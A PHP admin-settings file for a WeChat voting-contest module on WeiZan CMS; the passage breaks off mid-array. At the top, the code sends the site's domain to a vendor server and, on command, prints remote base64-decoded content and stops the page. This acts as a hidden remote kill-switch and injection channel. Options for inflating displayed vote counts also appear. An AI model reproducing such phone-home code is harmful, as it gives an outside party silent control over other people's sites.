<?php
/**
 * 女神来了模块定义
 *
 * @author 微赞科技
 * @url http://bbs.012wz.com/
 */
defined('IN_IA') or exit('Access Denied');
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}

$op = !empty($op) ? $op : $_GPC['op'];
$op = in_array($op, array('rshare', 'rhuihua', 'rdisplay', 'rvote', 'rbody', 'rcustom', 'rupload', 'rjifen', 'rstar')) ? $op : 'rshare';

			if (!empty($rdisplay['regtitlearr'])) {
				$regtitlearr = iunserializer($rdisplay['regtitlearr']);
			}
if ($op == 'rshare') {
	$rshare = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_share)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	$rshare['subscribedes'] = empty($rshare['subscribedes']) ? "请长按二维码关注或点击“关注投票”，前往".$_W['account']['name']."为您的好友投票。" : $rshare['subscribedes'];
	$rshare['sharephoto'] = empty($rshare['sharephoto']) ? FM_STATIC_MOBILE . "public/images/pimages.jpg" : $rshare['sharephoto'];

	if (checksubmit('submit')) {
		$insert_share = array(
			'rid' => $rid,
			'subscribe' => $_GPC['subscribe'] == 'on' ? 1 : 0,
			'isopentime' => $_GPC['isopentime'] == 'on' ? 1 : 0,
			'open_limittime' => $_GPC['open_limittime'],
			'open_url' => $_GPC['open_url'],
			'shareurl' => $_GPC['shareurl'],
			'sharetitle' => $_GPC['sharetitle'],
			'sharephoto' => $_GPC['sharephoto'],
			'sharecontent' => $_GPC['sharecontent'],
			'subscribedes' => $_GPC['subscribedes'],
			'sharelink' => $_GPC['sharelink'],
		);
		if (!empty($rshare['rid'])) {
			pdo_update($this->table_reply_share, $insert_share, array('rid' => $rid));
		} else {
			pdo_insert($this->table_reply_share, $insert_share);
		}
		message('更新成功！', referer(), 'success');
	}
} elseif ($op == 'rhuihua') {
	$rhuihua = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_huihua)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	$rhuihua['command'] = empty($rhuihua['command']) ? "报名" : $rhuihua['command'];
	$rhuihua['tcommand'] = empty($rhuihua['tcommand']) ? "t" : $rhuihua['tcommand'];
	if (checksubmit('submit')) {
		$insert_huihua = array(
			'rid' => $rid,
			'command' => $_GPC['command'],
			'tcommand' => $_GPC['tcommand'],
			'ishuodong' => $_GPC['ishuodong'],
			'huodongname' => $_GPC['huodongname'],
			'huodongdes' => $_GPC['huodongdes'],
			'hhhdpicture' => $_GPC['hhhdpicture'],
			'huodongurl' => $_GPC['huodongurl'],
			'regmessagetemplate' => $_GPC['regmessagetemplate'],
			'messagetemplate' => $_GPC['messagetemplate'],
			'shmessagetemplate' => $_GPC['shmessagetemplate'],
			'fmqftemplate' => $_GPC['fmqftemplate'],
			'msgtemplate' => $_GPC['msgtemplate']
		);
		if (!empty($rhuihua['rid'])) {
			pdo_update($this->table_reply_huihua, $insert_huihua, array('rid' => $rid));
		} else {
			pdo_insert($this->table_reply_huihua, $insert_huihua);
		}
		message('更新成功！', referer(), 'success');
	}
} elseif ($op == 'rdisplay') {
	$rdisplay = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_display)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	if (!empty($rdisplay['regtitlearr'])) {
		$regtitlearr = iunserializer($rdisplay['regtitlearr']);
	}
	if (!empty($rdisplay['qrset'])) {
		$qrset = iunserializer($rdisplay['qrset']);
	}
	$rdisplay['indexorder'] = empty($rdisplay['indexorder']) ? "1" : $rdisplay['indexorder'];
	$rdisplay['indexpx'] = empty($rdisplay['indexpx']) ? "0" : $rdisplay['indexpx'];
	$rdisplay['indextpxz'] = empty($rdisplay['indextpxz']) ? "10" : $rdisplay['indextpxz'];
	$rdisplay['phbtpxz'] = empty($rdisplay['phbtpxz']) ? "10" : $rdisplay['phbtpxz'];
	$rdisplay['isindex'] = !isset($rdisplay['isindex']) ? "1" : $rdisplay['isindex'];
	$rdisplay['isrealname'] = !isset($rdisplay['isrealname']) ? "1" : $rdisplay['isrealname'];
	$rdisplay['ismobile'] = !isset($rdisplay['ismobile']) ? "1" : $rdisplay['ismobile'];
	$rdisplay['isjob'] = !isset($rdisplay['isjob']) ? "1" : $rdisplay['isjob'];
	$rdisplay['isxingqu'] = !isset($rdisplay['isxingqu']) ? "1" : $rdisplay['isxingqu'];
	$rdisplay['isfans'] = !isset($rdisplay['isfans']) ? "1" : $rdisplay['isfans'];
	$rdisplay['copyrighturl'] = empty($rdisplay['copyrighturl']) ? "http://".$_SERVER ['HTTP_HOST'] : $rdisplay['copyrighturl'];
	$rdisplay['copyright'] = empty($rdisplay['copyright']) ? $_W['account']['name'] : $rdisplay['copyright'];
	$rdisplay['xuninum'] = !isset($rdisplay['xuninum']) ? "0" : $rdisplay['xuninum'];
	$rdisplay['csrs_total'] = !isset($rdisplay['csrs_total']) ? "0" : $rdisplay['csrs_total'];
	$rdisplay['ljtp_total'] = !isset($rdisplay['ljtp_total']) ? "0" : $rdisplay['ljtp_total'];
	$rdisplay['xuninumtime'] = !isset($rdisplay['xuninumtime']) ? "1800" : $rdisplay['xuninumtime'];
	$rdisplay['xuninuminitial'] = !isset($rdisplay['xuninuminitial']) ? "1" : $rdisplay['xuninuminitial'];
	$rdisplay['xuninumending'] = !isset($rdisplay['xuninumending']) ? "50" : $rdisplay['xuninumending'];
	$rdisplay['lapiao'] = empty($rdisplay['lapiao']) ? "拉票" : $rdisplay['lapiao'];
	$rdisplay['sharename'] = empty($rdisplay['sharename']) ? "分享" : $rdisplay['sharename'];
	$rdisplay['tpname'] = empty($rdisplay['tpname']) ? "投Ta一票" : $rdisplay['tpname'];
	$rdisplay['rqname'] = empty($rdisplay['rqname']) ? "人气" : $rdisplay['rqname'];
	$rdisplay['tpsname'] = empty($rdisplay['tpsname']) ? "票数" : $rdisplay['tpsname'];
	$rdisplay['isedes'] = !isset($rdisplay['isedes']) ? "1" : $rdisplay['isedes'];
	$rdisplay['csrs'] = empty($rdisplay['csrs']) ? "参赛人数" : $rdisplay['csrs'];
	$rdisplay['ljtp'] = empty($rdisplay['ljtp']) ? "累计投票" : $rdisplay['ljtp'];
	$rdisplay['cyrs'] = empty($rdisplay['cyrs']) ? "参与人数" : $rdisplay['cyrs'];
	$rdisplay['zanzhums'] = !isset($rdisplay['zanzhums']) ? "1" : $rdisplay['zanzhums'];
	$rdisplay['istopheader'] = !isset($rdisplay['istopheader']) ? "0" : $rdisplay['istopheader'];
	$rdisplay['ipannounce'] = !isset($rdisplay['ipannounce']) ? "0" : $rdisplay['ipannounce'];
	$rdisplay['isbgaudio'] = !isset($rdisplay['isbgaudio']) ? "0" : $rdisplay['isbgaudio'];
	$rdisplay['ishuodong'] = !isset($rdisplay['ishuodong']) ? "0" : $rdisplay['ishuodong'];
	$regtitlearr['cmmrealname'] = empty($regtitlearr['cmmrealname']) ? "姓名" : $regtitlearr['cmmrealname'];
	$regtitlearr['cmmmobile'] = empty($regtitlearr['cmmmobile']) ? "手机" : $regtitlearr['cmmmobile'];
	$regtitlearr['cmmphotosname'] = empty($regtitlearr['cmmphotosname']) ? "宣言" : $regtitlearr['cmmphotosname'];
	$regtitlearr['cmmregdes'] = empty($regtitlearr['cmmregdes']) ? "介绍" : $regtitlearr['cmmregdes'];
	$regtitlearr['cmmweixin'] = empty($regtitlearr['cmmweixin']) ? "微信" : $regtitlearr['cmmweixin'];
	$regtitlearr['cmmqqhao'] = empty($regtitlearr['cmmqqhao']) ? "QQ号" : $regtitlearr['cmmqqhao'];
	$regtitlearr['cmmemail'] = empty($regtitlearr['cmmemail']) ? "电子邮箱" : $regtitlearr['cmmemail'];
	$regtitlearr['cmmjob'] = empty($regtitlearr['cmmjob']) ? "职业" : $regtitlearr['cmmjob'];
	$regtitlearr['cmmxingqu'] = empty($regtitlearr['cmmxingqu']) ? "兴趣" : $regtitlearr['cmmxingqu'];
	$regtitlearr['cmmaddress'] = empty($regtitlearr['cmmaddress']) ? "地址" : $regtitlearr['cmmaddress'];
	$qrset['font_size']  = empty($qrset['font_size']) ? "20" : $qrset['font_size'];
	$qrset['font_path']  = empty($qrset['font_path']) ? "msyh.ttf" : $qrset['font_path'];
	$qrset['font_where']  = empty($qrset['font_where']) ? "9" : $qrset['font_where'];
	$qrset['qr_where']  = empty($qrset['qr_where']) ? "7" : $qrset['qr_where'];
	if (checksubmit('submit')) {
		$insert_display = array(
			'rid' => $rid,
			'istopheader' => $_GPC['istopheader'] == 'on' ? 1 : 0,
			'ipannounce' => $_GPC['ipannounce'] == 'on' ? 1 : 0,
			'isbgaudio' => $_GPC['isbgaudio'] == 'on' ? 1 : 0,
			'isvoteusers' => $_GPC['isvoteusers'] == 'on' ? 1 : 0,
			//'ishddjs' => $_GPC['ishddjs'] == 'on' ? 1 : 0,
			'openqr' => $_GPC['openqr'] == 'on' ? 1 : 0,
			'iscontent' => $_GPC['iscontent'] == 'on' ? 1 : 0,
			'open_vote_count' => $_GPC['open_vote_count'] == 'on' ? 1 : 0,
			'open_vote_size' => $_GPC['open_vote_size'],
			'bgmusic' => $_GPC['bgmusic'],
			'isedes' => $_GPC['isedes'] == 'on' ? 1 : 0,
			'tmoshi' => intval($_GPC['tmoshi']),
			'indextpxz' => intval($_GPC['indextpxz']),
			'indexorder' => $_GPC['indexorder'],
			'indexpx' => intval($_GPC['indexpx']),
			'phbtpxz' => intval($_GPC['phbtpxz']),
			'zanzhums' => $_GPC['zanzhums'],
			'csrs_total' => $_GPC['csrs_total'],
			'xunips' => $_GPC['xunips'],
			'ljtp_total' => $_GPC['ljtp_total'],
			'xuninum' => $_GPC['xuninum'],
			'cyrs_total' => $_GPC['cyrs_total'],
			'hits' => $_GPC['hits'],
			'xuninumtime' => $_GPC['xuninumtime'],
			'xuninuminitial' => $_GPC['xuninuminitial'],
			'xuninumending' => $_GPC['xuninumending'],
			'isrealname' => intval($_GPC['isrealname']),
			'ismobile' => intval($_GPC['ismobile']),
			'isphotosname' => intval($_GPC['isphotosname']),
			'isregdes' => intval($_GPC['isregdes']),
			'isweixin' => intval($_GPC['isweixin']),
			'isqqhao' => intval($_GPC['isqqhao']),
			'isemail' => intval($_GPC['isemail']),
			'isjob' => intval($_GPC['isjob']),
			'isxingqu' => intval($_GPC['isxingqu']),
			'isaddress' => intval($_GPC['isaddress']),
			'isindex' => intval($_GPC['isindex']),
			'isvotexq' => intval($_GPC['isvotexq']),
			'ispaihang' => intval($_GPC['ispaihang']),
			'isreg' => intval($_GPC['isreg']),
			'isdes' => intval($_GPC['isdes']),
			'lapiao' => $_GPC['lapiao'],
			'sharename' => $_GPC['sharename'],
			'tpname' => $_GPC['tpname'],
			'tpsname' => $_GPC['tpsname'],
			'rqname' => $_GPC['rqname'],
			'csrs' => $_GPC['csrs'],
			'ljtp' => $_GPC['ljtp'],
			'cyrs' => $_GPC['cyrs'],
			'iscopyright' => $_GPC['iscopyright'] == 'on' ? 1 : 0,
			'copyright' => $_GPC['copyright'],
			'copyrighturl' => $_GPC['copyrighturl']
		);
		$regtitlearr = array(
			'cmmrealname' => $_GPC['cmmrealname'],
			'cmmrealname_tip' => $_GPC['cmmrealname_tip'],
			'cmmmobile' => $_GPC['cmmmobile'],
			'cmmmobile_tip' => $_GPC['cmmmobile_tip'],
			'cmmphotosname' => $_GPC['cmmphotosname'],
			'cmmregdes' => $_GPC['cmmregdes'],
			'cmmweixin' => $_GPC['cmmweixin'],
			'cmmqqhao' => $_GPC['cmmqqhao'],
			'cmmemail' => $_GPC['cmmemail'],
			'cmmjob' => $_GPC['cmmjob'],
			'cmmxingqu' => $_GPC['cmmxingqu'],
			'cmmaddress' => $_GPC['cmmaddress'],
			'open_mobile' => $_GPC['open_mobile'],
			'open_photosname' => $_GPC['open_photosname'],
			'open_regdes' => $_GPC['open_regdes'],
			'open_weixin' => $_GPC['open_weixin'],
			'open_qqhao' => $_GPC['open_qqhao'],
			'open_email' => $_GPC['open_email'],
			'open_job' => $_GPC['open_job'],
			'open_xingqu' => $_GPC['open_xingqu'],
			'open_address' => $_GPC['open_address'],
			'open_mobile_zs' => $_GPC['open_mobile_zs'],
			'open_photosname_zs' => $_GPC['open_photosname_zs'],
			'open_regdes_zs' => $_GPC['open_regdes_zs'],
			'open_weixin_zs' => $_GPC['open_weixin_zs'],
			'open_qqhao_zs' => $_GPC['open_qqhao_zs'],
			'open_email_zs' => $_GPC['open_email_zs'],
			'open_job_zs' => $_GPC['open_job_zs'],
			'open_xingqu_zs' => $_GPC['open_xingqu_zs'],
			'open_address_zs' => $_GPC['open_address_zs']
		);
		$insert_display['regtitlearr'] = iserializer($regtitlearr);
		$qrset = array(
			'font_size' => $_GPC['font_size'],
			'font_color' => $_GPC['font_color'],
			'font_path' => $_GPC['font_path'],
			'font_where' => $_GPC['font_where'],
			'qr_where' => $_GPC['qr_where'],
		);
		$insert_display['qrset'] = iserializer($qrset);
		if (!empty($rdisplay['rid'])) {
			pdo_update($this->table_reply_display, $insert_display, array('rid' => $rid));
		} else {
			pdo_insert($this->table_reply_display, $insert_display);
		}
		message('更新成功！', referer(), 'success');
	}
} elseif ($op == 'rvote') {
	$rbasic = pdo_fetch("SELECT binduniacid FROM ".tablename($this->table_reply)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	$rvote = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_vote)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	$uniarr = explode(',',$rbasic['binduniacid']);
	$gduni = $_W['uniacid'];
	$condition = '';
	$pars = array();
	if (!empty($_W['isfounder'])) {
		$condition .= " WHERE a.default_acid <> 0 ";
		$order_by = " ORDER BY a.`rank` DESC";
	} else {
		$condition .= "LEFT JOIN ". tablename('uni_account_users')." as c ON a.uniacid = c.uniacid WHERE a.default_acid <> 0 AND c.uid = :uid";
		$pars[':uid'] = $_W['uid'];
		$order_by = " ORDER BY c.`rank` DESC";
	}
	$condition .= " AND (d.level = 3 OR d.level = 4) AND a.uniacid <> :uniacid";
		$pars[':uniacid'] = $gduni;
	$sql = "SELECT a.uniacid,a.name FROM ". tablename('uni_account'). " as a LEFT JOIN". tablename('account'). " as b ON a.default_acid = b.acid  LEFT JOIN ". tablename('account_wechats')." as d ON a.uniacid = d.uniacid  {$condition} {$order_by}, a.`uniacid` DESC";

	$rvote['isbbsreply'] = !isset($rvote['isbbsreply']) ? "1" : $rvote['isbbsreply'];
	$rvote['bbsreply_status'] = !isset($rvote['bbsreply_status']) ? "1" : $rvote['bbsreply_status'];
	$rvote['voteendtime'] = empty($rvote['voteendtime']) ?  strtotime(date("Y-m-d H:i", $now + 7 * 24 * 3600)) : $rvote['voteendtime'];
	$rvote['votestarttime'] = empty($rvote['votestarttime']) ? strtotime(date("Y-m-d H:i", $now + 3 * 24 * 3600)) : $rvote['votestarttime'];
	$rvote['cqtp'] = !isset($rvote['cqtp']) ? "1" : $rvote['cqtp'];
	$rvote['moshi'] = !isset($rvote['moshi']) ? "2" : $rvote['moshi'];;
	$rvote['tpsh'] = !isset($rvote['tpsh']) ? "0" : $rvote['tpsh'];
	$rvote['tpxz'] = empty($rvote['tpxz']) ? "5" : $rvote['tpxz'];
	$rvote['autolitpic'] = empty($rvote['autolitpic']) ? "500" : $rvote['autolitpic'];
	$rvote['autozl'] = empty($rvote['autozl']) ? "50" : $rvote['autozl'];
	//$rvote['daytpxz'] = empty($rvote['daytpxz']) ? "9" : $rvote['daytpxz'];
	$rvote['dayonetp'] = empty($rvote['dayonetp']) ? "1" : $rvote['dayonetp'];
	$rvote['allonetp'] = empty($rvote['allonetp']) ? "1" : $rvote['allonetp'];
	$rvote['fansmostvote'] = empty($rvote['fansmostvote']) ? "1" : $rvote['fansmostvote'];
	$rvote['userinfo'] = empty($rvote['userinfo']) ? "请留下您的个人信息，谢谢!" : $rvote['userinfo'];
	$rvote['addpvapp'] = !isset($rvote['addpvapp']) ? "1" : $rvote['addpvapp'];
	//$rvote['iscode'] = !isset($rvote['iscode']) ? "0" : $rvote['iscode'];
	//$rvote['codekey'] = empty($rvote['codekey']) ? "" : $rvote['codekey'];
	$rvote['tmreply'] = !isset($rvote['tmreply']) ? "1" : $rvote['tmreply'];
	$rvote['tmyushe'] = !isset($rvote['tmyushe']) ? "1" : $rvote['tmyushe'];
	$rvote['isipv'] = !isset($rvote['isipv']) ? "0" : $rvote['isipv'];
	$rvote['ipturl'] = !isset($rvote['ipturl']) ? "1" : $rvote['ipturl'];
	$rvote['ipstopvote'] = !isset($rvote['ipstopvote']) ? "1" : $rvote['ipstopvote'];
	$rvote['tmoshi'] = !isset($rvote['tmoshi']) ? "0" : $rvote['tmoshi'];
	$rvote['mediatype'] = !isset($rvote['mediatype']) ? "1" : $rvote['mediatype'];
	$rvote['mediatypem'] = !isset($rvote['mediatypem']) ? "0" : $rvote['mediatypem'];
	$rvote['mediatypev'] = !isset($rvote['mediatypev']) ? "0" : $rvote['mediatypev'];
	$rvote['votesuccess'] = empty($rvote['votesuccess']) ? "恭喜您成功的为编号为：#编号# ,姓名为： #参赛人名# 的参赛者投了 #投票票数# 票！并增加#积分#积分" : $rvote['votesuccess'];
	$rvote['limitip'] = empty($rvote['limitip']) ? "10" : $rvote['limitip'];
	$rvote['votetime'] = empty($rvote['votetime']) ? "10" : $rvote['votetime'];
	$rvote['iplocaldes'] = empty($rvote['iplocaldes']) ? "你所在的地区不在本次投票地区。本次投票地区： #限制地区#" : $rvote['iplocaldes'];


	$uniacids = pdo_fetchall($sql, $pars);
	if (checksubmit('submit')) {
		if (!empty($_GPC['binduniacid'])) {
			$binduniacid = implode(',',$_GPC['binduniacid']);
		}
		if ($_GPC['unimoshi'] == 1) {
			$fansmostvote = intval($_GPC['fansmostvote']);
			$daytpxz = intval($_GPC['daytpxz']);
			$allonetp = intval($_GPC['allonetp']);
			$dayonetp = intval($_GPC['dayonetp']);
		}else{
			$fansmostvote = intval($_GPC['u_fansmostvote']);
			$daytpxz = intval($_GPC['u_daytpxz']);
			$allonetp = intval($_GPC['u_allonetp']);
			$dayonetp = intval($_GPC['u_dayonetp']);
		}

		$insert_vote = array(
			'rid' => $rid,
			'iscode' => $_GPC['iscode'] == 'on' ? 1 : 0,
			'codekey' => $_GPC['codekey'],
			'codekeykey' => $_GPC['codekeykey'],
			'voteerinfo' => $_GPC['voteerinfo'] == 'on' ? 1 : 0,
			'votenumpiao' => $_GPC['votenumpiao'] == 'on' ? 1 : 0,
			'votepay' => $_GPC['votepay'] == 'on' ? 1 : 0,
			'giftvote' => $_GPC['giftvote'] == 'on' ? 1 : 0,
			'isopengiftlist' => $_GPC['isopengiftlist'] == 'on' ? 1 : 0,
			'votepaytitle' => $_GPC['votepaytitle'],
			'votepaydes' => $_GPC['votepaydes'],
			'votepayfee' => $_GPC['votepayfee'],
			'regpay' => $_GPC['regpay'] == 'on' ? 1 : 0,
			'regpaytitle' => $_GPC['regpaytitle'],
			'regpaydes' => $_GPC['regpaydes'],
			'regpayfee' => $_GPC['regpayfee'],
			'addpvapp' => $_GPC['addpvapp'] == 'on' ? 1 : 0,
			'isfans' => $_GPC['isfans'] == 'on' ? 1 : 0,
			'mediatype' => $_GPC['mediatype'] == 'on' ? 1 : 0,
			'mediatypem' => $_GPC['mediatypem'] == 'on' ? 1 : 0,
			'ismediatype' => $_GPC['ismediatype'] == 'on' ? 1 : 0,
			'ismediatypem' => $_GPC['ismediatypem'] == 'on' ? 1 : 0,
			'mediatypev' => $_GPC['mediatypev'] == 'on' ? 1 : 0,
			'ismediatypev' => $_GPC['ismediatypev'] == 'on' ? 1 : 0,
			'moshi' => intval($_GPC['moshi']),
			'webinfo' =>  htmlspecialchars_decode($_GPC['webinfo']),
			'cqtp' => $_GPC['cqtp'] == 'on' ? 1 : 0,
			'tpsh' => $_GPC['tpsh'] == 'on' ? 1 : 0,
			'isbbsreply' => $_GPC['isbbsreply'] == 'on' ? 1 : 0,
			'bbsreply_status' => $_GPC['bbsreply_status'] == 'on' ? 1 : 0,
			'tmyushe' => $_GPC['tmyushe'] == 'on' ? 1 : 0,
			'tmreply' => $_GPC['tmreply'] == 'on' ? 1 : 0,
			'isipv' => $_GPC['isipv'] == 'on' ? 1 : 0,
			'ipturl' => $_GPC['ipturl'] == 'on' ? 0 : 1,
			'ipstopvote' => $_GPC['ipstopvote'] == 'on' ? 0 : 1,
			'open_lbs_localtion' => $_GPC['open_lbs_localtion'] == 'on' ? 1 : 0,
			'open_lbs_type' => intval($_GPC['open_lbs_type']),
			'open_lbs_key_qq' => htmlspecialchars_decode($_GPC['open_lbs_key_qq']),
			'open_lbs_key_baidu' => htmlspecialchars_decode($_GPC['open_lbs_key_baidu']),
			'open_lbs_link' => $_GPC['open_lbs_link'],
			'iplocallimit' => $_GPC['iplocallimit'],
			'iplocaldes' => $_GPC['iplocaldes'],
			'tpxz' => $_GPC['tpxz'] > 9 ? '9' : intval($_GPC['tpxz']),
			'autolitpic' => intval($_GPC['autolitpic']),
			'autozl' => $_GPC['autozl'] > 100 ? '100' : intval($_GPC['autozl']),
			'limitip' => $_GPC['limitip'],
			'unimoshi' => $_GPC['unimoshi'],
			'usersmostvote' => intval($_GPC['usersmostvote']),
            'votestarttime' => strtotime($_GPC['vdatelimit']['start']),
            'voteendtime' => strtotime($_GPC['vdatelimit']['end']),
			'fansmostvote' => $fansmostvote,
			'daytpxz' => $daytpxz,
			'allonetp' => $allonetp,
			'dayonetp' => $dayonetp,
			'uni_fansmostvote' => intval($_GPC['uni_fansmostvote']),
			'uni_daytpxz' => intval($_GPC['uni_daytpxz']),
			'uni_allonetp' => intval($_GPC['uni_allonetp']),
			'uni_dayonetp' => intval($_GPC['uni_dayonetp']),
			'uni_all_users' => intval($_GPC['uni_all_users']),
			'userinfo' => $_GPC['userinfo'],
			'votesuccess' => $_GPC['votesuccess'],
			'limitsd' => intval($_GPC['limitsd']),
			'limitsdps' => intval($_GPC['limitsdps']),
			'limitsd_voter' => intval($_GPC['limitsd_voter']),
			'limitsdps_voter' => intval($_GPC['limitsdps_voter']),
			'open_smart' => $_GPC['open_smart'] == 'on' ? 1 : 0,
			'isanswer' => $_GPC['isanswer'] == 'on' ? 1 : 0,
			'answer_times' => intval($_GPC['answer_times']),
			'answer_times_ps' => intval($_GPC['answer_times_ps']),
			'opendx' => $_GPC['opendx'] == 'on' ? 1 : 0,
			'limittimes' => intval($_GPC['limittimes']),
		);
		if (!empty($rvote['rid'])) {
			pdo_update($this->table_reply_vote, $insert_vote, array('rid' => $rid));
		} else {
			pdo_insert($this->table_reply_vote, $insert_vote);
		}
		pdo_update($this->table_reply, array('binduniacid' => $gduni.','.$binduniacid), array('rid' => $rid));
		message('更新成功！', referer(), 'success');
	}
} elseif ($op == 'rbody') {
	$rbody = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_body)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
	$rbody_photosvote = iunserializer($rbody['rbody_photosvote']);
	$rbody_tuser = iunserializer($rbody['rbody_tuser']);
	$rbody_paihang = iunserializer($rbody['rbody_paihang']);
	$rbody_reg = iunserializer($rbody['rbody_reg']);
	$rbody_des = iunserializer($rbody['rbody_des']);
	$rbody_tags = iunserializer($rbody['rbody_tags']);
	$rbody['zbgcolor'] = empty($rbody['zbgcolor']) ? "#3a0255" : $rbody['zbgcolor'];
	$rbody['zbg'] = empty($rbody['zbg']) ? FM_STATIC_MOBILE . "public/photos/bg.jpg" : $rbody['zbg'];
	$rbody['zbgtj'] = empty($rbody['zbgtj']) ? FM_STATIC_MOBILE . "public/photos/bg_x.png" : $rbody['zbgtj'];
	$rbody['voicebg'] = empty($rbody['voicebg']) ? "" : $rbody['voicebg'];
	$rbody['topbgcolor'] = empty($rbody['topbgcolor']) ? "" : $rbody['topbgcolor'];
	$rbody['topbg'] = empty($rbody['topbg']) ? "" : $rbody['topbg'];
	$rbody['topbgtext'] = empty($rbody['topbgtext']) ? "" : $rbody['topbgtext'];
	$rbody['topbgrightcolor'] = empty($rbody['topbgrightcolor']) ? "" : $rbody['topbgrightcolor'];
	$rbody['topbgright'] = empty($rbody['topbgright']) ? "" : $rbody['topbgright'];
	$rbody['foobg1'] = empty($rbody['foobg1']) ? "" : $rbody['foobg1'];
	$rbody['foobg2'] = empty($rbody['foobg2']) ? "" : $rbody['foobg2'];
	$rbody['foobgtextn'] = empty($rbody['foobgtextn']) ? "" : $rbody['foobgtextn'];
	$rbody['foobgtexty'] = empty($rbody['foobgtexty']) ? "" : $rbody['foobgtexty'];
	$rbody['foobgtextmore'] = empty($rbody['foobgtextmore']) ? "" : $rbody['foobgtextmore'];
	$rbody['foobgmorecolor'] = empty($rbody['foobgmorecolor']) ? "" : $rbody['foobgmorecolor'];
	$rbody['foobgmore'] = empty($rbody['foobgmore']) ? "" : $rbody['foobgmore'];
	$rbody['bodytextcolor'] = empty($rbody['bodytextcolor']) ? "" : $rbody['bodytextcolor'];
	$rbody['bodynumcolor'] = empty($rbody['bodynumcolor']) ? "" : $rbody['bodynumcolor'];
	$rbody['bodytscolor'] = empty($rbody['bodytscolor']) ? "" : $rbody['bodytscolor'];
	$rbody['bodytsbg'] = empty($rbody['bodytsbg']) ? "" : $rbody['bodytsbg'];
	$rbody['copyrightcolor'] = empty($rbody['copyrightcolor']) ? "" : $rbody['copyrightcolor'];
	$rbody['inputcolor'] = empty($rbody['inputcolor']) ? "" : $rbody['inputcolor'];
	$rbody['xinbg'] = empty($rbody['xinbg']) ? "" : $rbody['xinbg'];
	if (checksubmit('submit')) {
		$insert_body = array(
			'rid' => $rid,
			'zbgcolor' => $_GPC['zbgcolor'],
			'zbg' => $_GPC['zbg'],
			'voicebg' => $_GPC['voicebg'],
			'zbgtj' => $_GPC['zbgtj'],
			'topbgcolor' => $_GPC['topbgcolor'],
			'topbg' => $_GPC['topbg'],
			'topbgtext' => $_GPC['topbgtext'],
			'topbgrightcolor' => $_GPC['topbgrightcolor'],
			'topbgright' => $_GPC['topbgright'],
			'foobg1' => $_GPC['foobg1'],
			'foobg2' => $_GPC['foobg2'],
			'foobgtextn' => $_GPC['foobgtextn'],
			'foobgtexty' => $_GPC['foobgtexty'],
			'foobgtextmore' => $_GPC['foobgtextmore'],
			'foobgmorecolor' => $_GPC['foobgmorecolor'],
			'foobgmore' => $_GPC['foobgmore'],
			'bodytextcolor' => $_GPC['bodytextcolor'],
			'bodynumcolor' => $_GPC['bodynumcolor'],
			'inputcolor' => $_GPC['inputcolor'],
			'bodytscolor' => $_GPC['bodytscolor'],
			'bodytsbg' => $_GPC['bodytsbg'],
			'xinbg' => $_GPC['xinbg'],
			'copyrightcolor' => $_GPC['copyrightcolor'],
			'photosvote' => $_GPC['photosvote'] =='on' ? 1 : 0,
			'tuser' => $_GPC['tuser'] =='on' ? 1 : 0,
			'paihang' => $_GPC['paihang'] =='on' ? 1 : 0,
			'reg' => $_GPC['reg'] =='on' ? 1 : 0,
			'des' => $_GPC['des'] =='on' ? 1 : 0,
			'tags' => $_GPC['tags'] =='on' ? 1 : 0,
			'other' => $_GPC['other'] =='on' ? 1 : 0,
		);
		$rbody_photosvote = array(
			'photosvote_bgcolor' => $_GPC['photosvote_bgcolor'],
			'photosvote_bgimg' => $_GPC['photosvote_bgimg'],
			'photosvote_tj_bgcolor' => $_GPC['photosvote_tj_bgcolor'],
			'photosvote_tj_bgimg' => $_GPC['photosvote_tj_bgimg'],
			'photosvote_tj_text_color' => $_GPC['photosvote_tj_text_color'],
			'photosvote_tj_num_color' => $_GPC['photosvote_tj_num_color'],
			'photosvote_des_title_color' => $_GPC['photosvote_des_title_color'],
			'photosvote_des_xin_img' => $_GPC['photosvote_des_xin_img'],
			'photosvote_des_text_color' => $_GPC['photosvote_des_text_color'],
			'photosvote_des_text_more_color' => $_GPC['photosvote_des_text_more_color'],
			'photosvote_des_bg_color' => $_GPC['photosvote_des_bg_color'],
			'photosvote_tp_title_color' => $_GPC['photosvote_tp_title_color'],
			'photosvote_tp_xin_img' => $_GPC['photosvote_tp_xin_img'],
			'photosvote_tp_tag_text_color' => $_GPC['photosvote_tp_tag_text_color'],
			'photosvote_tp_tag_an_text_color' => $_GPC['photosvote_tp_tag_an_text_color'],
			'photosvote_tp_tag_an_color' => $_GPC['photosvote_tp_tag_an_color'],
			'photosvote_tp_tag_an_img' => $_GPC['photosvote_tp_tag_an_img'],
			'photosvote_tp_tag_color' => $_GPC['photosvote_tp_tag_color'],
			'photosvote_tp_color' => $_GPC['photosvote_tp_color'],
			'photosvote_tp_user_color' => $_GPC['photosvote_tp_user_color'],
			'photosvote_tp_user_border_color' => $_GPC['photosvote_tp_user_border_color'],
			'photosvote_tp_user_text_color' => $_GPC['photosvote_tp_user_text_color'],
			'photosvote_tp_user_num_color' => $_GPC['photosvote_tp_user_num_color'],
			'photosvote_tp_user_ps_color' => $_GPC['photosvote_tp_user_ps_color'],
			'photosvote_tp_user_ps_text_color' => $_GPC['photosvote_tp_user_ps_text_color'],
			'photosvote_tp_user_ps_num_color' => $_GPC['photosvote_tp_user_ps_num_color'],
			'photosvote_tp_user_ps_an_text_color' => $_GPC['photosvote_tp_user_ps_an_text_color'],
			'photosvote_tp_user_ps_an_bg_color' => $_GPC['photosvote_tp_user_ps_an_bg_color'],
			'photosvote_tp_user_ps_an_bg_img' => $_GPC['photosvote_tp_user_ps_an_bg_img'],
			'topbgsocolor' => $_GPC['topbgsocolor'],
			'topbgsoinputcolor' => $_GPC['topbgsoinputcolor'],
